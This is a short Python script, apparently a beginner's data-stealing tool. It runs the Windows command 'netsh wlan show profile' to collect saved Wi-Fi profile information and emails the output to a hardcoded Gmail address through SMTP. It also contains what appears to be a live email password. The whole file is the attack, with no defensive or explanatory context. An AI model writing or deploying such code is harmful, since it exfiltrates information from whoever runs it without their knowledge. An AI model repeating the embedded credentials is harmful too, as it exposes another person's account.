# !usr/bin/env/python

import subprocess, smtplib, re
def send_mail(email, password, message):
    server=smtplib.SMTP('smtp.gmail.com',587)
    server.starttls() #init tls connnection
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

command='netsh wlan show profile'
result=subprocess.check_output(command, shell=True).decode('utf-8')
send_mail('khoi08022004@gmail.com','iceqykoojysrbgry',result)